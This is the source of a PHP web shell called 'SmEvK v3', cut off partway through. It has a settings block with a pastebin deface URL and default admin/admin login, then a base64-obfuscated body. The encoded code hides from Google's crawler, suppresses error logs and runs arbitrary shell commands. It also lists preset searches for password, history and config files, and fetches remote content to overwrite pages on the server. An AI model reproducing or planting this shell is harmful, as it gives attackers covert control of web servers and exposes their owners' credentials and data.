<?php 

//Changelog 22.11.2020: Removed Logos, FB Links, Stylecleanup
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
//Change Shell Theme here//
$color = "#FFF";                                   //Fonts color modify here.
$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
$TabsColor = '#0E5061';                              //Change tabs color here.
#-------------------------------------------------------------------------------

?>
<?php
$smevk = "PD9waHAKJGRlZmF1bHRfYWN0aW9uID0gJ0ZpbGVzTWFuJzsKQGRlZmluZSgnU0VMRl9QQVRIJywgX19GSUxFX18pOwppZiAoc3RycG9zKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSwgJ0dvb2dsZScpICE9PSBmYWxzZSkgewogICAgaGVhZGVyKCdIVFRQLzEuMCA0MDQgTm90IEZvdW5kJyk7CiAgICBleGl0Owp9CgpAc2Vzc2lvbl9zdGFydCgpOwpAZXJyb3JfcmVwb3J0aW5nKDApOwpAaW5pX3NldCgnZXJyb3JfbG9nJywgTlVMTCk7CkBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOwpAaW5pX3NldCgnbG9nX2Vycm9ycycsIDApOwpAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgMCk7CkBzZXRfdGltZV9saW1pdCgwKTsKLy9Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOwppZiAoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkgewogICAgZnVuY3Rpb24gc3RyaXBzbGFzaGVzX2FycmF5KCRhcnJheSkKICAgIHsKICAgICAgICByZXR1cm4gaXNfYXJyYXkoJGFycmF5KSA/IGFycmF5X21hcCgnc3RyaXBzbGFzaGVzX2FycmF5JywgJGFycmF5KSA6IHN0cmlwc2xhc2hlcygkYXJyYXkpOwogICAgfQogICAgJF9QT1NUID0gc3RyaXBzbGFzaGVzX2FycmF5KCRfUE9TVCk7Cn0KCmZ1bmN0aW9uIHByaW50TG9naW4oKQp7CiAgICBpZiAoJF9QT1NUWydwYXNzJ10gIT0gJGF1dGhfcGFzcyAmJiAkX1BPU1RbJ3VuYW1lJ10gIT0gJFVzZXJOYW1lKSB7CiAgICAgICAgJHN0YXR1cyA9ICdXcm9uZyBQYXNzd29yZCBvciBVc2VyTmFtZSA6KCc7CiAgICAgICAgCiAgICAgICAgCiAgICB9CiAgICAKPz4KCjxodG1sPgo8aGVhZD4KPHRpdGxlPlNtRXZLIHYzPC90aXRsZT4KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUpvc2VmaW4rU2Fuczo0MDAsMTAwIiByZWw9InN0eWxlc2hlZXQiPgo8L2hlYWQ+CjxzdHlsZT4KYm9keXsKICAgZm9udC1mYW1pbHk6IEpvc2VmaW4gU2Fucywgc2Fucy1zZXJpZjsKICAgIGJhY2tncm91bmQ6IGJsYWNrOwogICAgY29sb3I6I0FCRUZGRjsKfQogICAgLmxvZ2lucGFnZSBpbWd7CiAgICAgICAgd2lkdGg6IDUwMHB4OwogICAgICAgIGhlaWdodDogMTUwcHg7CiAgICB9CiAgICAubG9naW5wYWdlewogICAgICAgIGhlaWdodDogNDAwcHg7CiAgICAgICAgd2lkdGg6IDUwMHB4OwogICAgICAgIGJvcmRlcjoxcHggc29saWQ7CiAgICAgICAgYm9yZGVyLWNvbG9yOiNBQkVGRkY7CiAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICBtYXJnaW4tdG9wOiAxMDBweDsKICAgIH0KICAgICNwYWdlaGVhZGluZ3sKICAgICAgICBmb250LXNpemU6MjVweDsKICAgICAgICBjb2xvcjojQUJFRkZGOwogICAgICAgIG1hcmdpbi10b3A6IDEwcHg7CiAgICB9CiAgICAubG9naW5wYWdlIGltZ3sKICAgICAgICB3aWR0aDogNTAwcHg7CiAgICAKICAgIH0KICAgIGlucHV0ewogICAgICAgIGJhY2tncm91bmQ6IGJsYWNrOwogICAgICAgIGJvcmRlci1jb2xvcjojQUJFRkZGOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgICAgbWFyZ2luLXRvcDogMTBweDsgCiAgICAgICAgcGFkZGluZzo1cHg7CiAgICAgICAgY29sb3I6ICNBQkVGRkY7CiAgICB9CiAgICAgaW5wdXQ6aG92ZXJ7CiAgICAgICAgYmFja2dyb3VuZDogI0FCRUZGRjsKICAgICAgICBjb2xvcjogcmVkOwoKICAgICB9Cgo8L3N0eWxlPgo8Ym9keT4KPGNlbnRlcj4KPGRpdiBjbGFzcz0ibG9naW5wYWdlIj4KICAgIDxkaXYgaWQ9InBhZ2VoZWFkaW5nIj5TbUV2S19QYVRoQW4gU2hlbGwgVjM8L2Rpdj4KICAgIDxmb3JtIG1ldGhvZD0icG9zdCI+CiAgICAgICAgVXNlciBOYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idW5hbWUiID48YnI+CiAgICAgICAgUGFzc3dvcmQgOiAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiA+PGJyPgogICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ibG9naW4iIHZhbHVlPSJMb2dpbiI+CiA8P3BocAogICAgCiAgICBpZiAoaXNzZXQoJHN0YXR1cykpIHsKPz4gIAogCgogICAgIAoKICAgIDwvZm9ybT4KICAgCjwvZDxwPjw/PSAkc3RhdHVzID8+PC9wPiAKPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPgoKPD9waHAKICAgICAgICAKICAgICAgICAKICAgIH0KICAgIGV4aXQ7Cn0KCmlmICghaXNzZXQoJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSkpCiAgICBpZiAoZW1wdHkoJGF1dGhfcGFzcykgfHwgKGlzc2V0KCRfUE9TVFsncGFzcyddKSAmJiAoJF9QT1NUWydwYXNzJ10pID09ICRhdXRoX3Bhc3MgJiYgKCRfUE9TVFsndW5hbWUnXSkgPT0gJFVzZXJOYW1lKSkKICAgICAgICAkX1NFU1NJT05bbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSldID0gdHJ1ZTsKICAgIAogICAgZWxzZQogICAgICAgIHByaW50TG9naW4oKTsKCmlmIChzdHJ0b2xvd2VyKHN1YnN0cihQSFBfT1MsIDAsIDMpKSA9PSAid2luIikKICAgICRvcyA9ICd3aW4nOwplbHNlCiAgICAkb3MgPSAnbml4JzsKJHNhZmVfbW9kZSAgICAgICAgID0gQGluaV9nZXQoJ3NhZmVfbW9kZScpOwokZGlzYWJsZV9mdW5jdGlvbnMgPSBAaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsKJGhvbWVfY3dkICAgICAgICAgID0gQGdldGN3ZCgpOwppZiAoaXNzZXQoJF9QT1NUWydjJ10pKQogICAgQGNoZGlyKCRfUE9TVFsnYyddKTsKJGN3ZCA9IEBnZXRjd2QoKTsKaWYgKCRvcyA9PSAnd2luJykgewogICAgJGhvbWVfY3dkID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCAkaG9tZV9jd2QpOwogICAgJGN3ZCAgICAgID0gc3RyX3JlcGxhY2UoIlxcIiwgIi8iLCAkY3dkKTsKfQppZiAoJGN3ZFtzdHJsZW4oJGN3ZCkgLSAxXSAhPSAnLycpCiAgICAkY3dkIC49ICcvJzsKCmlmICgkb3MgPT0gJ3dpbicpIHsKICAgICRhbGlhc2VzID0gYXJyYXkoCiAgICAgICAgIkxpc3QgRGlyZWN0b3J5IiA9PiAiZGlyIiwKICAgICAgICAiRmluZCBpbmRleC5waHAgaW4gY3VycmVudCBkaXIiID0+ICJkaXIgL3MgL3cgL2IgaW5kZXgucGhwIiwKICAgICAgICAiRmluZCAqY29uZmlnKi5waHAgaW4gY3VycmVudCBkaXIiID0+ICJkaXIgL3MgL3cgL2IgKmNvbmZpZyoucGhwIiwKICAgICAgICAiU2hvdyBhY3RpdmUgY29ubmVjdGlvbnMiID0+ICJuZXRzdGF0IC1hbiIsCiAgICAgICAgIlNob3cgcnVubmluZyBzZXJ2aWNlcyIgPT4gIm5ldCBzdGFydCIsCiAgICAgICAgIlVzZXIgYWNjb3VudHMiID0+ICJuZXQgdXNlciIsCiAgICAgICAgIlNob3cgY29tcHV0ZXJzIiA9PiAibmV0IHZpZXciLAogICAgICAgICJBUlAgVGFibGUiID0+ICJhcnAgLWEiLAogICAgICAgICJJUCBDb25maWd1cmF0aW9uIiA9PiAiaXBjb25maWcgL2FsbCIKICAgICk7Cn0gZWxzZSB7CiAgICAkYWxpYXNlcyA9IGFycmF5KAogICAgICAgICJMaXN0IGRpciIgPT4gImxzIC1sYSIsCiAgICAgICAgImxpc3QgZmlsZSBhdHRyaWJ1dGVzIG9uIGEgTGludXggc2Vjb25kIGV4dGVuZGVkIGZpbGUgc3lzdGVtIiA9PiAibHNhdHRyIC12YSIsCiAgICAgICAgInNob3cgb3BlbmVkIHBvcnRzIiA9PiAibmV0c3RhdCAtYW4gfCBncmVwIC1pIGxpc3RlbiIsCiAgICAgICAgIkZpbmQiID0+ICIiLAogICAgICAgICJmaW5kIGFsbCBzdWlkIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLXBlcm0gLTA0MDAwIC1scyIsCiAgICAgICAgImZpbmQgc3VpZCBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZpbmQgLiAtdHlwZSBmIC1wZXJtIC0wNDAwMCAtbHMiLAogICAgICAgICJmaW5kIGFsbCBzZ2lkIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLXBlcm0gLTAyMDAwIC1scyIsCiAgICAgICAgImZpbmQgc2dpZCBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZpbmQgLiAtdHlwZSBmIC1wZXJtIC0wMjAwMCAtbHMiLAogICAgICAgICJmaW5kIGNvbmZpZy5pbmMucGhwIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLW5hbWUgY29uZmlnLmluYy5waHAiLAogICAgICAgICJmaW5kIGNvbmZpZyogZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtbmFtZSBcImNvbmZpZypcIiIsCiAgICAgICAgImZpbmQgY29uZmlnKiBmaWxlcyBpbiBjdXJyZW50IGRpciIgPT4gImZpbmQgLiAtdHlwZSBmIC1uYW1lIFwiY29uZmlnKlwiIiwKICAgICAgICAiZmluZCBhbGwgd3JpdGFibGUgZm9sZGVycyBhbmQgZmlsZXMiID0+ICJmaW5kIC8gLXBlcm0gLTIgLWxzIiwKICAgICAgICAiZmluZCBhbGwgd3JpdGFibGUgZm9sZGVycyBhbmQgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXBlcm0gLTIgLWxzIiwKICAgICAgICAiZmluZCBhbGwgc2VydmljZS5wd2QgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtbmFtZSBzZXJ2aWNlLnB3ZCIsCiAgICAgICAgImZpbmQgc2VydmljZS5wd2QgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXR5cGUgZiAtbmFtZSBzZXJ2aWNlLnB3ZCIsCiAgICAgICAgImZpbmQgYWxsIC5odHBhc3N3ZCBmaWxlcyIgPT4gImZpbmQgLyAtdHlwZSBmIC1uYW1lIC5odHBhc3N3ZCIsCiAgICAgICAgImZpbmQgLmh0cGFzc3dkIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLW5hbWUgLmh0cGFzc3dkIiwKICAgICAgICAiZmluZCBhbGwgLmJhc2hfaGlzdG9yeSBmaWxlcyIgPT4gImZpbmQgLyAtdHlwZSBmIC1uYW1lIC5iYXNoX2hpc3RvcnkiLAogICAgICAgICJmaW5kIC5iYXNoX2hpc3RvcnkgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXR5cGUgZiAtbmFtZSAuYmFzaF9oaXN0b3J5IiwKICAgICAgICAiZmluZCBhbGwgLmZldGNobWFpbHJjIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLW5hbWUgLmZldGNobWFpbHJjIiwKICAgICAgICAiZmluZCAuZmV0Y2htYWlscmMgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXR5cGUgZiAtbmFtZSAuZmV0Y2htYWlscmMiLAogICAgICAgICJMb2NhdGUiID0+ICIiLAogICAgICAgICJsb2NhdGUgaHR0cGQuY29uZiBmaWxlcyIgPT4gImxvY2F0ZSBodHRwZC5jb25mIiwKICAgICAgICAibG9jYXRlIHZob3N0cy5jb25mIGZpbGVzIiA9PiAibG9jYXRlIHZob3N0cy5jb25mIiwKICAgICAgICAibG9jYXRlIHByb2Z0cGQuY29uZiBmaWxlcyIgPT4gImxvY2F0ZSBwcm9mdHBkLmNvbmYiLAogICAgICAgICJsb2NhdGUgcHN5Ym5jLmNvbmYgZmlsZXMiID0+ICJsb2NhdGUgcHN5Ym5jLmNvbmYiLAogICAgICAgICJsb2NhdGUgbXkuY29uZiBmaWxlcyIgPT4gImxvY2F0ZSBteS5jb25mIiwKICAgICAgICAibG9jYXRlIGFkbWluLnBocCBmaWxlcyIgPT4gImxvY2F0ZSBhZG1pbi5waHAiLAogICAgICAgICJsb2NhdGUgY2ZnLnBocCBmaWxlcyIgPT4gImxvY2F0ZSBjZmcucGhwIiwKICAgICAgICAibG9jYXRlIGNvbmYucGhwIGZpbGVzIiA9PiAibG9jYXRlIGNvbmYucGhwIiwKICAgICAgICAibG9jYXRlIGNvbmZpZy5kYXQgZmlsZXMiID0+ICJsb2NhdGUgY29uZmlnLmRhdCIsCiAgICAgICAgImxvY2F0ZSBjb25maWcucGhwIGZpbGVzIiA9PiAibG9jYXRlIGNvbmZpZy5waHAiLAogICAgICAgICJsb2NhdGUgY29uZmlnLmluYyBmaWxlcyIgPT4gImxvY2F0ZSBjb25maWcuaW5jIiwKICAgICAgICAibG9jYXRlIGNvbmZpZy5pbmMucGhwIiA9PiAibG9jYXRlIGNvbmZpZy5pbmMucGhwIiwKICAgICAgICAibG9jYXRlIGNvbmZpZy5kZWZhdWx0LnBocCBmaWxlcyIgPT4gImxvY2F0ZSBjb25maWcuZGVmYXVsdC5waHAiLAogICAgICAgICJsb2NhdGUgY29uZmlnKiBmaWxlcyAiID0+ICJsb2NhdGUgY29uZmlnIiwKICAgICAgICAibG9jYXRlIC5jb25mIGZpbGVzIiA9PiAibG9jYXRlICcuY29uZiciLAogICAgICAgICJsb2NhdGUgLnB3ZCBmaWxlcyIgPT4gImxvY2F0ZSAnLnB3ZCciLAogICAgICAgICJsb2NhdGUgLnNxbCBmaWxlcyIgPT4gImxvY2F0ZSAnLnNxbCciLAogICAgICAgICJsb2NhdGUgLmh0cGFzc3dkIGZpbGVzIiA9PiAibG9jYXRlICcuaHRwYXNzd2QnIiwKICAgICAgICAibG9jYXRlIC5iYXNoX2hpc3RvcnkgZmlsZXMiID0+ICJsb2NhdGUgJy5iYXNoX2hpc3RvcnknIiwKICAgICAgICAibG9jYXRlIC5teXNxbF9oaXN0b3J5IGZpbGVzIiA9PiAibG9jYXRlICcubXlzcWxfaGlzdG9yeSciLAogICAgICAgICJsb2NhdGUgLmZldGNobWFpbHJjIGZpbGVzIiA9PiAibG9jYXRlICcuZmV0Y2htYWlscmMnIiwKICAgICAgICAibG9jYXRlIGJhY2t1cCBmaWxlcyIgPT4gImxvY2F0ZSBiYWNrdXAiLAogICAgICAgICJsb2NhdGUgZHVtcCBmaWxlcyIgPT4gImxvY2F0ZSBkdW1wIiwKICAgICAgICAibG9jYXRlIHByaXYgZmlsZXMiID0+ICJsb2NhdGUgcHJpdiIKICAgICk7Cn0KaWYgKGlzc2V0KCRfUE9TVFsncDEnXSkgJiYgJF9QT1NUWydwMSddID09ICdkZWZhY2UnKSB7CiAgICAKICAgICRkZWYgPSBmaWxlX2dldF9jb250ZW50cygkZGVmYWNlX3VybCk7CiAgICBmaWxlX3B1dF9jb250ZW50cygkX1BPU1RbJ2MnXSAuICRfUE9TVFsncDInXSwgJGRlZik7Cn0KZnVuY3Rpb24gZXgoJGluKQp7CiAgICAkb3V0ID0gJyc7CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpIHsKICAgICAgICBAZXhlYygkaW4sICRvdXQpOwogICAgICAgICRvdXQgPSBAam9pbigiXG4iLCAkb3V0KTsKICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpIHsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIEBwYXNzdGhydSgkaW4pOwogICAgICAgICRvdXQgPSBvYl9nZXRfY2xlYW4oKTsKICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKSB7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBAc3lzdGVtKCRpbik7CiAgICAgICAgJG91dCA9IG9iX2dldF9jbGVhbigpOwogICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKSB7CiAgICAgICAgJG91dCA9IHNoZWxsX2V4ZWMoJGluKTsKICAgIH0gZWxzZWlmIChpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkaW4sICJyIikpKSB7CiAgICAgICAgJG91dCA9ICIiOwogICAgICAgIHdoaWxlICghQGZlb2YoJGYpKQogICAgICAgICAgICAkb3V0IC49IGZyZWFkKCRmLCAxMDI0KTsKICAgICAgICBwY2xvc2UoJGYpOwogICAgfQogICAgcmV0dXJuICRvdXQ7Cn0KCmZ1bmN0aW9uIHdoaWNoKCRwKQp7CiAgICAkcGF0aCA9IGV4KCd3aGljaCAnIC4gJHApOwogICAgaWYgKCFlbXB0eSgkcGF0aCkpCiAgICAgICAgcmV0dXJuICRwYXRoOwogICAgcmV0dXJuIGZhbHNlOwp9CgpmdW5jdGlvbiBwcmludEhlYWRlcigpCnsKICAgIGlmIChlbXB0eSgkX1BPU1RbJ2NoYXJzZXQnXSkpCiAgICAgICAgJF9QT1NUWydjaGFyc2V0J10gPSAiVVRGLTgiOwogICAgZ2xvYmFsICRjb2xvcjsKICAgIGdsb2JhbCAkVGhlbWU7CiAgICBnbG9iYWwgJFRhYnNDb2xvcjsKICAgIGVjaG8gIjxodG1sPjxoZWFkPjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Kb3NlZmluK1NhbnM6NDAwLDEwMCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+PC9oZWFkPiI7CiAgICBlY2hvICc8aHRtbD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9JyAuICRfUE9TVFsnY2hhcnNldCddIC4gJyI+PHRpdGxlPlNtRXZLIHYzPC90aXRsZT4KPHN0eWxlPgogICAgICAgIGJvZHkge2JhY2tncm91bmQtY29sb3I6YmxhY2s7Y29sb3I6I2ZmZjt9CiAgICAgICAgYm9keSx0ZCx0aCAgICB7IGZvbnQtZmFtaWx5OiBKb3NlZmluIFNhbnMsIHNhbnMtc2VyaWY7Zm9udC1zaXplOjEzcHg7bWFyZ2luOjA7dmVydGljYWwtYWxpZ246dG9wOyB9CiAgICAgICAgc3BhbixoMSxhICAgIHsgY29sb3I6JyAuICRjb2xvciAuICcgIWltcG9ydGFudDsgfQogICAgICAgIHNwYW4gICAgICAgIHsgZm9udC13ZWlnaHQ6IGJvbGRlcjsgfQogICAgICAgIGgxICAgICAgICAgICAgeyBwYWRkaW5nOiAwcHggNXB4O2ZvbnQ6IDE0cHQgYXVkaW93aWRlO21hcmdpbjowcHggMCAwIDBweDsgfQogICAgICAgIGRpdi5jb250ZW50ICAgIHsgcGFkZGluZzogMHB4O21hcmdpbjowIDBweDtiYWNrZ3JvdW5kOiAjMEYxMDEwO2JvcmRlcjoxcHggc29saWQgJyAuICRUaGVtZSAuICc7IGJvcmRlci1yYWRpdXM6NXB4O30KICAgICAgICBhICAgICAgICAgICAgeyB0ZXh0LWRlY29yYXRpb246bm9uZTsgICB9CiAgICAgICAgYTpob3ZlciAgICAgICAgeyBib3JkZXItYm90dG9tOjBweCBzb2xpZCAjNWU1ZTVlO3RleHQtZGVjb3JhdGlvbjpub25lOyB9CiAgICAgICAgLm1sMSAgICAgICAgeyBib3JkZXI6MXB4IHNvbGlkICcgLiAkVGhlbWUgLiAnO3BhZGRpbmc6cHg7bWFyZ2luOjA7b3ZlcmZsb3c6IGF1dG87IH0KICAgICAgICAuYmlnYXJlYSAgICB7IHdpZHRoOjEwMCU7aGVpZ2h0OjI1MHB4O21hcmdpbi10b3A6MHB4OyBib3JkZXItcmFkaXVzOjEwcHg7IGJvcmRlci1jb2xvcjonIC4gJFRoZW1lIC4gJzsgYmFja2dyb3VuZDojMkYyRjJGO30KICAgICAgICBpbnB1dCwgdGV4dGFyZWEsIHNlbGVjdCAgICB7IG1hcmdpbi10b3A6MDtjb2xvcjojNjNFMUZGO2JhY2tncm91bmQtY29sb3I6YmxhY2s7Ym9yZGVyLXJhZGl1czo1cHg7Ym9yZGVyOjFweCBzb2xpZCAnIC4gJFRoZW1lIC4gJzsgYm9yZGVyLXJhZGlzOjVweDtmb250OiAxMHB0IGFyaWFsLCJDb3VyaWVyIE5ldyI7IH0KICAgICAgICBpbnB1dFt0eXBlPSJidXR0b24iXTpob3ZlcixpbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlciB7YmFja2dyb3VuZC1jb2xvcjojMDk0RjYwO2NvbG9yOmJsYWNrO3RleHQtZGVjb3JhdGlvbjpub25lO30gCiAgICAgICAgZm9ybSAgICAgICAgeyBtYXJnaW46MHB4OyBiYWNrZ3JvdW5kOiMwRjEwMTA7fQogICAgICAgICN0b29sc1RibCAgICB7IHRleHQtYWxpZ246Y2VudGVyOyB9CiAgICAgICAgLnRvb2xzSW5wICAgIHsgd2lkdGg6IDgwJTsgYmFja2dyb3VuZDpibGFjazsgYm9yZGVyLXJhZGl1czo1cHg7IGJvcmRlci1jb2xvcjonIC4gJFRoZW1lIC4gJzsgfQogICAgICAgIC5tYWluIHRoICAgIHt0ZXh0LWFsaWduOmxlZnQ7YmFja2dyb3VuZC1jb2xvcjonIC4gJFRhYnNDb2xvciAuICc7fQogICAgICAgIC5tYWluIHRyOmhvdmVye2JhY2tncm91bmQ6JyAuICRUaGVtZSAuICc7IGJvcmRlcjo1cHggc29saWQ7Ym9yZGVyLWNvbG9yOicgLiAkVGhlbWUgLiAnO30KICAgICAgICAubWFpbiB0ZCwgdGh7dmVydGljYWwtYWxpZ246bWlkZGxlO30KICAgICAgICAubWVudSB7IGhlaWdodDozMHB4OyBib3JkZXItcmFkaXVzOjEwcHg7fQogICAgICAgIC5tZW51IHRoe3BhZGRpbmc6MXB4O2JvcmRlci1yYWRpdXM6IDVweDsgIGJhY2tncm91bmQ6JyAuICRUYWJzQ29sb3IgLiAnOwogICAgICAgIC5tZW51IHRoOmhvdmVye2JhY2tncm91bmQ6IzBGMTAxMDt0ZXh0LWRlY29yYXRpb246IG5vbmU7fQogICAgICAgICAgICAgICAgcHJlIHtmb250LWZhbWlseTogSm9zZWZpbiBTYW5zLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkZGRkY7fQogICAgICAgICNjb3RfdGxfZml4ZWR7cG9zaXRpb246Zml4ZWQ7Ym90dG9tOjBweDtmb250LXNpemU6MTJweDtsZWZ0OjBweDtwYWRkaW5nOjRweCAwO2NsaXA6X3RvcDpleHByZXNzaW9uKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zY3JvbGxUb3ArZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmNsaWVudEhlaWdodC10aGlzLmNsaWVudEhlaWdodCk7X2xlZnQ6ZXhwcmVzc2lvbihkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsTGVmdCArIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5jbGllbnRXaWR0aCAtIG9mZnNldFdpZHRoKTt9CgogICAgICAgICAgICAgICAgCiAgICAgICAgLmNwciB7bWFyZ2luLWJvdHRvbTo1cHg7Zm9udC13ZWlnaHQ6Ym9sZDsgfQogICAgICAgIC5jcGIge3dpZHRoOjM0cHg7bWFyZ2luOjAgNXB4O30KICAgICAgICAKICAgICAgICAubnBvYWQgdGQge3BhZGRpbmc6MDt9CiAgICAgICAgI1NtZXZrdG9vbHN7CiAgICAgICAgbWFyZ2luLXRvcDo1MHB4OwogICAgICAgIHdpZHRoOjUwMHB4OwogICAgICAgIGJvcmRlcjoxcHggc29saWQ7CiAgICAgICAgYm9yZGVyLXJhZGl1czoxMHB4OwogICAgfQogICAgLnNtZXZrbG9nbyB0ZHsKICAgICAgICBmb250LXNpemU6MTJweDsKICAgICAgICBmb250LXdlaWdodDpib2xkOwogICAgICAgIAoKCiAgICB9CiAgICAuc21ldmtsb2dvewogICAgICAgIG1hcmdpbi1sZWZ0OjVweDsKICAgICAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OwogICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogQ0VOVEVSOyAKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiMwRjEwMTA7CiAgICAgICAgYmFja2dyb3VuZC1zaXplOiA0MDBweCAxMjBweDsKCgoKICAgIH0KICAgIDwvc3R5bGU+Cgo8L2h0bWw+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Ym9keSwgYTpob3ZlciB7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Y3Vyc29yOiB1cmwoaHR0cDovL2N1ci5jdXJzb3JzLTR1Lm5ldC9jdXJzb3JzL2N1ci0xMS9jdXIxMDU0LmN1ciksIHByb2dyZXNzICFpbXBvcnRhbnQ7fTwvc3R5bGU+PGEgaHJlZj0iaHR0cDovL3d3dy5jdXJzb3JzLTR1LmNvbS9jdXJzb3IvMjAxMi8wMi8xMS9jaHJvbWUtcG9pbnRlci5odG1sIiB0YXJnZXQ9Il9ibGFuayIgdGl0bGU9IkNocm9tZSBQb2ludGVyIj48aW1nIHNyYz0iaHR0cDovL2N1ci5jdXJzb3JzLTR1Lm5ldC9jdXJzb3IucG5nIiBib3JkZXI9IjAiIGFsdD0iQ2hyb21lIFBvaW50ZXIiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTsgdG9wOiAwcHg7IHJpZ2h0OiAwcHg7IiAvPjwvYT4KICAgIDxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gc2V0KGEsYyxwMSxwMixwMyxjaGFyc2V0KSB7CiAgICAgICAgICAgIGlmKGEgIT0gbnVsbClkb2N1bWVudC5tZi5hLnZhbHVlPWE7CiAgICAgICAgICAgIGlmKGMgIT0gbnVsbClkb2N1bWVudC5tZi5jLnZhbHVlPWM7CiAgICAgICAgICAgIGlmKHAxICE9IG51bGwpZG9jdW1lbnQubWYucDEudmFsdWU9cDE7CiAgICAgICAgICAgIGlmKHAyICE9IG51bGwpZG9jdW1lbnQubWYucDIudmFsdWU9cDI7CiAgICAgICAgICAgIGlmKHAzICE9IG51bGwpZG9jdW1lbnQubWYucDMudmFsdWU9cDM7CiAgICAgICAgICAgIGlmKGNoYXJzZXQgIT0gbnVsbClkb2N1bWVudC5tZi5jaGFyc2V0LnZhbHVlPWNoYXJzZXQ7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGcoYSxjLHAxLHAyLHAzLGNoYXJzZXQpIHsKICAgICAgICAgICAgc2V0KGEsYyxwMSxwMixwMyxjaGFyc2V0KTsKICAgICAgICAgICAgZG9jdW1lbnQubWYuc3VibWl0KCk7CiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIGEoYSxjLHAxLHAyLHAzLGNoYXJzZXQpIHsKICAgICAgICAgICAgc2V0KGEsYyxwMSxwMixwMyxjaGFyc2V0KTsKICAgICAgICAgICAgdmFyIHBhcmFtcyA9ICJhamF4PXRydWUiOwogICAgICAgICAgICBmb3IoaT0wO2k8ZG9jdW1lbnQubWYuZWxlbWVudHMubGVuZ3RoO2krKykKICAgICAgICAgICAgICAgIHBhcmFtcyArPSAiJiIrZG9jdW1lbnQubWYuZWxlbWVudHNbaV0ubmFtZSsiPSIrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50Lm1mLmVsZW1lbnRzW2ldLnZhbHVlKTsKICAgICAgICAgICAgc3IoIicgLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSAuICciLCBwYXJhbXMpOwogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBzcih1cmwsIHBhcmFtcykgeyAgICAKICAgICAgICAgICAgaWYgKHdpbmRvdy5YTUxIdHRwUmVxdWVzdCkgewogICAgICAgICAgICAgICAgcmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICByZXEub25yZWFkeXN0YXRlY2hhbmdlID0gcHJvY2Vzc1JlcUNoYW5nZTsKICAgICAgICAgICAgICAgIHJlcS5vcGVuKCJQT1NUIiwgdXJsLCB0cnVlKTsKICAgICAgICAgICAgICAgIHJlcS5zZXRSZXF1ZXN0SGVhZGVyICgiQ29udGVudC1UeXBlIiwgImFwcGxpY2F0aW9u